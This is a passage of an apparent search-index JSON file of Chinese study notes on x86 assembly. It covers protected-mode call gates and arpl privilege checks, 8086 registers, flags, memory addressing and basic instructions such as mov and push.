\u65f6\u7684\u6743\u9650\u6bd4\u8f83\uff1a \u8c03\u7528\u8005\u7684 CPL <= call_gate_selector->descripter.DPL \u8c03\u7528\u8005\u7684 CPL >= call_gate_selector->descriptor.target_selector->descriptor.DPL CPU \u4ece ROM \u542f\u52a8\u540e\u8fdb\u5165\u5b9e\u6a21\u5f0f\uff0c\u800c\u5b9e\u6a21\u5f0f\u7684\u6743\u9650\u90fd\u662f ring0\uff0c\u53ef\u4ee5\u5728\u5b9e\u6a21\u5f0f\u4e2d\u6267\u884c retf \u6765\u964d\u7ea7\u5230 ring3\u3002\u6784\u9020 jmp far ptr tss_selector:0 \u53ef\u4ee5\u4ece ring0 \u5f3a\u884c\u8df3\u56de ring3\uff08\u9700\u8981\u6784\u9020 tss \u4e0e\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\uff09 \u4ee5 memset(p, 0, n) \u4e3a\u4f8b\uff0cring0 \u51fd\u6570\u5982\u4f55\u9632\u6b62 ring3 \u4f20\u9012\u4e00\u4e2a\u6076\u610f\u7684\u6307\u9488\u5982 ring0 \u6307\u9488 p\u3002ring3 \u8fdb\u7a0b\u5047\u5982\u4e0d\u8c03\u7528 memset()\uff0c\u800c\u662f\u81ea\u5df1\u505a *p = ... \u7684\u5199\u5165\u4e00\u5b9a\u4f1a\u89e6\u53d1 GPF(General Protect Fault) \u5373\u5728\u8be5\u6307\u4ee4\u524d\u63d2\u5165\u5e76\u8c03\u7528 int 0Dh \u5047\u8bbe\u5728 ring3 \u4e2d\u8c03\u7528 memset(p, 0, 1) p = 0x2800000000\uff08\u5047\u8bbe 0x28 \u8fd9\u4e2a selector \u5bf9\u5e94\u6bb5\u7684 DPL \u662f 0\uff09 push 1 push 0 push 28 h push 0 call far ptr call_gate_to_memset : 0 \u5f53\u8fd9\u6761 call \u53d1\u751f\u65f6\uff0cring3 \u7684\u5806\u6808\u4e2d\u4ec5\u6709 call \u6307\u4ee4\u4e0a\u65b9 push \u7684\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u4e0b\u6761\u6307\u4ee4\u7684\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u3002CPU \u4f1a\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684 tss\uff08task state segment\uff0c\u901a\u8fc7 ltr \u6307\u4ee4\u8d4b\u503c\uff09\u4e2d\u53d6\u51fa ss0 \u53ca esp0 \u4f5c\u4e3a\u65b0\u7684\u5806\u6808\u6307\u9488\uff08ss = ss0, esp = esp0\uff09\uff0c\u8fdb\u884c\u5806\u6808\u5207\u6362\u3002\u4e4b\u540e\u8fdb\u884c\u7684\u64cd\u4f5c\u6709\uff1a push ring3 \u7684 ss\u3001push ring3 \u7684 esp \u628a ring3 \u4e2d\u7684\u53c2\u6570\u5168\u90e8\u590d\u5236\u5230 ring0 \u5806\u6808\u4e2d push ring3 \u7684 cs\u3001push ring3 \u7684 eip jmp \u76ee\u6807\u51fd\u6570 memset \u51fd\u6570\u4e2d\u4f1a\u53d6\u51fa\u8c03\u7528\u8005\u7684 cs\uff0c\u53d6\u51fa CPL \u4e0e\u53c2\u6570 p \u6bb5\u5730\u5740\u7684 DPL \u8fdb\u884c\u6bd4\u8f83 memset: push ebp mov ebp , esp mov cx , [ ebp + 8 ] ; \u8c03\u7528\u8005 ring3 \u7684 cs mov ax , [ ebp + 10 h ] ; 28h arpl ax , cx ; adjust request privilege level ; \u4f1a\u628a cx \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 ax \u7684\u4f4e 2 \u4f4d\uff0c\u5373 ax \u53d8\u4e3a 2Bh mov ds , ax ; \u8fd9\u91cc\u4f1a\u89e6\u53d1 GPF ; CPU \u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u5f53 cs.cpl <= 28h \u6bb5\u7684 DPL ; && ax.rpl <= 28h \u6bb5\u7684 DPL \u65f6\u624d\u80fd\u8d4b\u503c\u6210\u529f\uff08ax.rpl \u5373 ax \u7684\u4f4e 2 \u4f4d\uff09 arpl \u4fdd\u62a4\u6a21\u5f0f \u6307\u4ee4\u683c\u5f0f \uff1aarpl dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08adjust request privilege level\uff09\u5f53 src \u7684\u4f4e 2 \u4f4d\u5927\u4e8e dest \u7684\u4f4e 2 \u4f4d\u65f6\uff0c\u4f1a\u628a src \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 dest \u7684\u4f4e 2 \u4f4d \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0csrc \u4e3a\u5bc4\u5b58\u5668","title":"x86 \u6c47\u7f16\u8bed\u8a00"},{"location":"cs/pl/asm/#x86","text":"Abstract \u81ea\u5b66\uff0c\u770b\u4e66\u300a\u6c47\u7f16\u8bed\u8a00\uff08\u7b2c4\u7248\uff09\u300b\u738b\u723d \u6d59\u6c5f\u5927\u5b66\u767d\u6d2a\u6b22\u8001\u5e08 \u201c\u6c47\u7f16\u8bed\u8a00\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b https://faydoc.tripod.com/cpu/index.htm","title":"x86 \u6c47\u7f16\u8bed\u8a00"},{"location":"cs/pl/asm/#_1","text":"\u4e00\u4e9b\u4ec5\u4f9b\u4e86\u89e3\u7684\u4e1c\u897f \u673a\u5668\u8bed\u8a00\uff1a\u673a\u5668\u6307\u4ee4\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u7684\u96c6\u5408 CPU \u53ef\u4ee5\u6267\u884c\u673a\u5668\u6307\u4ee4\uff0c\u8fdb\u884c\u8fd0\u7b97 \u6c47\u7f16\u8bed\u8a00\u4e3b\u4f53\u662f\u6c47\u7f16\u6307\u4ee4\uff0c\u6c47\u7f16\u6307\u4ee4\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7ed9\u8ba1\u7b97\u673a\u6267\u884c \u5bc4\u5b58\u5668\uff1aCPU \u4e2d\u53ef\u4ee5\u5b58\u50a8\u6570\u636e\u7684\u5668\u4ef6 \u6c47\u7f16\u8bed\u8a00\u7ec4\u6210\uff1a \u6c47\u7f16\u6307\u4ee4\uff1a\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff0c\u662f\u673a\u5668\u7801\u7684\u52a9\u8bb0\u7b26 \u4f2a\u6307\u4ee4\uff1a\u7531\u7f16\u8bd1\u5668\u6267\u884c\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u5176\u4ed6\u7b26\u53f7\uff08+-*/\u7b49\uff09\uff1a\u7531\u7f16\u8bd1\u5668\u8bc6\u522b\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u5b58\u653e\uff0c\u88ab CPU \u4f7f\u7528 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e8c\u8fdb\u5236\u4fe1\u606f \u8ba1\u7b97\u673a\u6700\u5c0f\u4fe1\u606f\u5355\u4f4d\u662f bit\uff0c8 \u4e2a bit \u7ec4\u6210\u4e00\u4e2a Byte\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e2a Byte\uff088 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff09\uff0c\u5b58\u50a8\u5355\u5143\u4ece 0 \u5f00\u59cb\u7f16\u53f7 CPU \u901a\u8fc7\u603b\u7ebf\u4e0e\u5b58\u50a8\u5668\u82af\u7247\u4f20\u8f93\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u606f\uff08\u603b\u7ebf\uff1a\u8fde\u63a5 CPU \u548c\u5176\u4ed6\u82af\u7247\u7684\u4e00\u5806\u5bfc\u7ebf\uff09 CPU \u4ece\u5185\u5b58\u8bfb\u53d6\u6570\u636e\u7684\u8fc7\u7a0b\uff1a CPU \u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f\u53d1\u51fa CPU \u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u544a\u77e5\u6307\u5b9a\u5b58\u50a8\u5668\u82af\u7247\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e \u5b58\u50a8\u5668\u5c06\u6240\u9700\u5730\u5740\u5904\u7684\u6570\u636e\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u7ed9 CPU CPU \u901a\u8fc7 \u5730\u5740\u603b\u7ebf \u6307\u5b9a\u5b58\u50a8\u5355\u5143\u3002\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU \u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740 \u4e00\u4e2a CPU \u6709 n \u6839\u5730\u5740\u7ebf\uff0c\u5219\u8fd9\u4e2a CPU \u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a n\uff0c\u8fd9\u6837\u7684 CPU \u6700\u591a\u53ef\u4ee5\u5bfb\u627e 2 n \u4e2a\u5185\u5b58\u5355\u5143 CPU \u901a\u8fc7 \u6570\u636e\u603b\u7ebf \u6765\u4e0e\u5185\u5b58\u6216\u5176\u4ed6\u5668\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u3002\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u4e0e\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6 8 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e00\u4e2a 8 \u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff081 \u4e2a\u5b57\u8282\uff09\uff0c16 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e24\u4e2a\u5b57\u8282 8088 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 8\uff0c8086 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 16 CPU \u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u5bf9\u5916\u90e8\u5668\u4ef6\u8fdb\u884c\u63a7\u5236\u3002\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b \u4e3b\u677f\u4e0a\u5668\u4ef6\u901a\u8fc7\u603b\u7ebf\u548c CPU \u76f8\u8fde CPU \u901a\u8fc7\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684\u63a5\u53e3\u5361\u95f4\u63a5\u63a7\u5236\u5916\u8bbe \u5b58\u50a8\u5668\u82af\u7247\u4ece\u8bfb\u5199\u4e0a\u5206\u4e3a \u968f\u673a\u5b58\u50a8\u5668\uff08RAM\uff09\u548c \u53ea\u8bfb\u5b58\u50a8\u5668\uff08ROM\uff09 RAM \u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u5fc5\u987b\u5e26\u7535\u5b58\u50a8\uff0c\u5173\u673a\u540e\u5185\u5bb9\u4e22\u5931 ROM \u53ea\u8bfb\u4e0d\u5199\uff0c\u4f46\u5173\u673a\u540e\u5185\u5bb9\u4e0d\u4e22\u5931 \u5b58\u50a8\u5668\u4ece\u529f\u80fd\u548c\u8fde\u63a5\u4e0a\u5206\u4e3a\uff1a \u968f\u673a\u5b58\u50a8\u5668\uff1a\u5b58\u653e\u4f9b CPU \u4f7f\u7528\u7684\u7edd\u5927\u90e8\u5206\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u7531\u88c5\u5728\u4e3b\u677f\u4e0a\u7684 RAM \u548c\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684 RAM \u7ec4\u6210 \u88c5\u6709 BIOS \u7684 ROM\uff1a\u5382\u5546\u63d0\u4f9b\u7684\u8f6f\u4ef6\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b83\u5229\u7528\u8be5\u786c\u4ef6\u8bbe\u5907\u8fdb\u884c\u6700\u57fa\u672c\u7684\u8f93\u5165\u8f93\u51fa \u63a5\u53e3\u5361\u4e0a\u7684 RAM\uff1a\u67d0\u4e9b\u63a5\u53e3\u5361\u9700\u8981\u5bf9\u5927\u6279\u91cf\u8f93\u5165\u3001\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u6682\u65f6\u5b58\u50a8\uff0c\u5728\u5176\u4e0a\u88c5\u6709 RAM\uff08\u5982\u663e\u5b58\uff09 CPU \u5728\u64cd\u63a7\u5b58\u50a8\u5668\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u5373\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a\u7269\u7406\u5b58\u50a8\u5668\u5728\u5176\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u5730\u5740\u7a7a\u95f4","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"cs/pl/asm/#_2","text":"\u4e8c\u8fdb\u5236\u6570\u672b\u5c3e\u7528 B/b \u4f5c\u540e\u7f00\uff0c\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u7528 H/h \u4f5c\u540e\u7f00\u4e14\u5982\u679c\u5f00\u5934\u4e3a\u5b57\u6bcd\u5219\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a 0\uff0c\u516b\u8fdb\u5236\u672b\u5c3e\u7528 Q/q \u4f5c\u540e\u7f00\uff0c\u5341\u8fdb\u5236\u4e0d\u7528\u540e\u7f00 \u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53eb\u4e00\u4f4d\uff08bit\uff09\uff0c\u56db\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u534a\u5b57\u8282\uff08nibble\uff09\uff0c\u516b\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\u8282\uff08byte\uff09\uff0c\u5341\u516d\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\uff08word\uff09\uff0c\u4e09\u5341\u4e8c\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u53cc\u5b57\uff08double word\uff09 \u5b57\u7b26\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5355\u5f15\u53f7\u62ec\u5b57\u7b26\u6765\u8868\u793a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94 ASCII \u7801\u6765\u8868\u793a","title":"\u6570\u636e\u7684\u8868\u793a\u4e0e\u7ec4\u7ec7"},{"location":"cs/pl/asm/#_3","text":"8086 \u5185\u90e8\u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff0c8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c4 \u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c2 \u4e2a\u63a7\u5236\u5bc4\u5b58\u5668 \u901a\u7528\u5bc4\u5b58\u5668 \u6570\u636e\u5bc4\u5b58\u5668\uff1aax bx cx dx\uff0c\u7528\u4e8e\u5b58\u653e\u6570\u636e\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 16 \u4f4d\uff0c\u53ef\u5206\u4e3a\u9ad8\u4f4e 8 \u4f4d\uff0c\u9ad8 8 \u4f4d\u5206\u522b\u4e3a ah bh ch dh\uff0c\u4f4e\u516b\u4f4d\u5206\u522b\u4e3a al bl cl dl\uff0c\u4e14\u5982\u679c\u53ea\u4fee\u6539\u516b\u4f4d\uff0c\u5219\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u5916\u516b\u4f4d\uff08\u6bd4\u5982\u6ea2\u51fa\u4e0d\u4f1a\u4ece al \u6ea2\u51fa\u5230 ah\uff09 ax\uff1a\u7d2f\u52a0\u5668\uff0c\u5e38\u7528\u4f5c\u7d2f\u52a0\uff0c\u4e14\u5728\u4e58\u9664\u6cd5\u3001\u4e32\u8fd0\u7b97\u3001IO \u4e2d\u6709\u4e13\u95e8\u7528\u5904 bx\uff1a\u57fa\u5740\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u6765\u5b58\u653e\u5bfb\u5740\u7684\u57fa\u5740 cx\uff1a\u8ba1\u6570\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u5728\u5faa\u73af\u4e2d\u4f5c\u4e3a\u8ba1\u6570\u5668 dx\uff1a\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5b58\u653e IO \u7aef\u53e3\u5730\u5740\uff0c\u4e14\u5728\u53cc\u5b57\u8fd0\u7b97\u4e2d\u4f5c\u4e3a ax \u7684\u6269\u5c55\u9ad8\u5341\u516d\u4f4d \u53d8\u5740\u5bc4\u5b58\u5668\uff1asi di\uff0c\u5e38\u7528\u6765\u5bfb\u5740 si\uff1a\u6e90\u53d8\u5740\u5bc4\u5b58\u5668 di\uff1a\u76ee\u7684\u53d8\u5740\u5bc4\u5b58\u5668 \u6307\u9488\u5bc4\u5b58\u5668\uff1asp bp\uff0c\u5e38\u4e0e ss \u6784\u6210\u8fdc\u6307\u9488 sp\uff1a\u5806\u6808\u6307\u9488\u5bc4\u5b58\u5668\uff0css:sp \u6307\u5411\u5806\u6808\u9876\u7aef bp\uff1a\u57fa\u5740\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5e38\u7528 ss:bp \u6307\u5411\u5806\u6808\u4e2d\u6570\u636e \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es cs\uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740 ss\uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740 ds\uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740 es\uff1a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u9644\u52a0\u6570\u636e\u6bb5\u6bb5\u5730\u5740 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aip fl ip\uff1a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u504f\u79fb\u5730\u5740\uff0c cs:ip \u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u9996\u5b57\u8282\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee ip fl\uff1a\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c16 \u4f4d\u4f46\u53ea\u4f7f\u7528 9 \u4f4d\u8868\u793a 6 \u4e2a\u72b6\u6001\u6807\u5fd7\u548c 3 \u4e2a\u63a7\u5236\u6807\u5fd7\uff08df if tf\uff09 of\uff1aoverflow flag \u6ea2\u51fa\u6807\u5fd7\uff0c\u7b2c 11 \u4f4d\uff0c\u8868\u793a\u8fd0\u7b97\u662f\u5426\u6ea2\u51fa df\uff1adirection flag \u65b9\u5411\u6807\u5fd7\uff0c\u7b2c 10 \u4f4d\uff0c\u6807\u5fd7\u5b57\u7b26\u4e32\u5904\u7406\u6307\u4ee4\u4e2d\u5904\u7406\u4fe1\u606f\u7684\u65b9\u5411 if\uff1ainterrupt flag \u4e2d\u65ad\u6807\u5fd7\uff0c\u7b2c 9 \u4f4d\uff0c\u662f\u5426\u5141\u8bb8\u5916\u90e8\u786c\u4ef6\u4e2d\u65ad tf\uff1atrace flag \u8ddf\u8e2a\u6807\u5fd7\uff0c\u7b2c 8 \u4f4d\uff0cCPU \u662f\u5426\u8fdb\u5165\u5355\u6b65\u5de5\u4f5c\u72b6\u6001 sf\uff1asign flag \u7b26\u53f7\u6807\u5fd7\uff0c\u7b2c 7 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\uff081 \u8868\u793a\u8d1f\uff09 zf\uff1azero flag \u96f6\u6807\u5fd7\uff0c\u7b2c 6 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a 0 af\uff1aauxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 4 \u4f4d\uff0c\u8bb0\u5f55\u8fd0\u7b97\u65f6\u7b2c\u4e09\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u4ea7\u751f\u8fdb\u501f\u4f4d pf\uff1aparity flag \u5947\u5076\u6807\u5fd7\uff0c\u7b2c 2 \u4f4d\uff0c\u7ed3\u679c\u64cd\u4f5c\u6570\u4e2d\u4f4e 8 \u4f4d 1 \u7684\u4e2a\u6570\u662f\u5426\u4e3a\u5076\u6570 cf\uff1acarry flag \u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 0 \u4f4d\uff0c\u8fd0\u7b97\u65f6\u6700\u9ad8\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u6709\u8fdb\u501f\u4f4d 80386 32 \u4f4d\u5bc4\u5b58\u5668\u4e00\u5171\u6709 16 \u4e2a \u901a\u7528\u5bc4\u5b58\u5668 eax ebx ecx edx\uff0c\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 ax \u8868\u793a\u4f4e 16 \u4f4d\uff0cah al \u5206\u522b\u8868\u793a\u4f4e 16 \u4f4d\u4e2d\u7684\u9ad8\u4f4e 8 \u4f4d esi edi\uff0c\u4f4e 16 \u4f4d\u4e3a si di esp ebp\uff0c\u4f4e 16 \u4f4d\u4e3a sp bp \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es fs gs\uff08\u591a\u4e86\u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff09 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aeip eflags","title":"\u5185\u90e8\u5bc4\u5b58\u5668"},{"location":"cs/pl/asm/#8086","text":"\u53ef\u8bbf\u95ee\u7684\u5185\u5b58\u4e00\u5171\u6709 1MB\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a 00000h~FFFFFh\uff0c\u8fd9\u6837\u7528 20 \u4f4d\u8868\u793a\u7684\u5730\u5740\u79f0\u4e3a\u7269\u7406\u5730\u5740 \u5bfb\u5740\u65f6\u4f7f\u7528\u7684\u662f \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u5f62\u5f0f\u7684\u903b\u8f91\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u4e3a \u6bb5\u5730\u5740*16+\u504f\u79fb\u5730\u5740\uff0c\u6c47\u7f16\u91cc\u5199\u6210 \u6bb5\u5730\u5740:[\u504f\u79fb\u5730\u5740]\u3002\u540c\u6837\u4e5f\u5bb9\u6613\u770b\u51fa\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5bf9\u5e94\u7684\u903b\u8f91\u5730\u5740\u8868\u793a\u5e76\u4e0d\u552f\u4e00","title":"8086 \u5185\u5b58\u7ec4\u7ec7"},{"location":"cs/pl/asm/#_4","text":"\u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u7531\u64cd\u4f5c\u7801\uff08opcode\uff09\u548c\u64cd\u4f5c\u6570\uff08operand\uff09\u6784\u6210\uff0c\u4efb\u4f55\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7801\uff0c\u64cd\u4f5c\u6570\u7684\u4e2a\u6570\u4e0d\u4e00\u5b9a","title":"\u6307\u4ee4\u7cfb\u7edf\u4e0e\u5bfb\u5740\u65b9\u5f0f"},{"location":"cs/pl/asm/#_5","text":"\u7acb\u5373\u6570\u65b9\u5f0f \uff1a\u5373\u64cd\u4f5c\u6570\u4e3a\u5e38\u6570 \u5bc4\u5b58\u5668\u65b9\u5f0f \uff1a\u4ee5\u5bc4\u5b58\u5668\u4e3a\u64cd\u4f5c\u6570 \u76f4\u63a5\u5bfb\u5740 \uff1a\u901a\u8fc7\u903b\u8f91\u5730\u5740\u8868\u793a\u64cd\u4f5c\u6570\uff0c\u4e14\u504f\u79fb\u5730\u5740\u4e3a\u7acb\u5373\u6570\uff0c\u6bd4\u5982 [1234h]\u3001ss:[1234h]\uff0c\u7701\u7565\u60c5\u51b5\u9ed8\u8ba4 ds \u95f4\u63a5\u5bfb\u5740 \uff1a\u903b\u8f91\u5730\u5740\u7684\u504f\u79fb\u5730\u5740\u4ee5\u95f4\u63a5\u5f62\u5f0f\u8868\u793a\uff0c\u65b9\u62ec\u53f7\u5185\u53ea\u80fd\u662f bx bp si di\uff0c\u4e14\u8868\u793a\u4e3a \u57fa\u5740\u5bc4\u5b58\u5668\uff08bx bp \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u53d8\u5740\u5bc4\u5b58\u5668\uff08si di \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u4f4d\u79fb\u91cf\uff08\u7acb\u5373\u6570\u6216\u6ca1\u6709\uff09\u7684\u5f62\u5f0f \u5373 bx bp \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff0csi di \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0 \u7701\u7565\u6bb5\u5730\u5740\u65f6\uff0c\u5982\u679c\u504f\u79fb\u5730\u5740\u5185\u6709 bp \u51fa\u73b0\uff0c\u5219\u7f3a\u7701\u6bb5\u5730\u5740\u4e3a ss\uff0c\u5176\u5b83\u60c5\u51b5\u5747\u4e3a ds \u6bb5\u5730\u5740\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u9664 cs ss ds \u5916\u7684\u5176\u5b83\u6bb5\u5730\u5740\u9884\u5148\u5b58\u5728 es \u4e2d\u518d\u5bfb\u5740","title":"\u64cd\u4f5c\u6570\u5bfb\u5740\u65b9\u5f0f"},{"location":"cs/pl/asm/#8086_1","text":"\u5982\u679c\u6307\u4ee4\u4e2d\u6ca1\u6709\u6807\u5fd7\u4f4d\u8868\u683c\uff0c\u5219\u8be5\u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\u3002\u53f3\u659c\u7ebf\u8868\u793a\u8be5\u6807\u5fd7\u4f4d\u7531\u7ed3\u679c\u51b3\u5b9a\uff0c\u5168\u90e8\u586b\u5145\u4e3a\u6839\u636e\u7279\u6b8a\u610f\u4e49\u8bbe\u5b9a\uff08\u6ce8\u610f\u4e2d\u4f1a\u5177\u4f53\u8bf4\uff09\uff0c\u6253\u53c9\u4e3a undefined\uff08\u4e00\u822c\u4e0d\u53d8\uff09","title":"8086 \u6c47\u7f16\u6307\u4ee4"},{"location":"cs/pl/asm/#_6","text":"","title":"\u6570\u636e\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_7","text":"mov \u6307\u4ee4\u683c\u5f0f \uff1amov a, b \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 b \u7684\u503c\u4f20\u5165 a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0cb \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u3001\u903b\u8f91\u5730\u5740\u6216\u7acb\u5373\u6570\uff0c\u4f46 a b \u6700\u591a\u6709\u4e00\u4e2a\u662f\u903b\u8f91\u5730\u5740\uff0c\u4e14\u5982\u679c\u662f\u5c06\u7acb\u5373\u6570\u4f20\u5165\u903b\u8f91\u5730\u5740\u6240\u6307\u5185\u5b58\u65f6\u8981\u6807\u6ce8\u5927\u5c0f\uff08byte ptr / word ptr\uff09\uff0c\u5e76\u4e14 a b \u5bbd\u5ea6\u9700\u4e00\u81f4\u3002\u4e0d\u80fd\u628a\u7acb\u5373\u6570\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\uff0c\u4e5f\u4e0d\u80fd\u628a\u6bb5\u5bc4\u5b58\u5668\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d push \u6307\u4ee4\u683c\u5f0f \uff1apush a \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 a \u538b\u5165\u6808\uff0c\u5373 sp = sp - 2, word ptr ss:[sp] = a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u5185\u5bb9\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e0d\u80fd\u662f 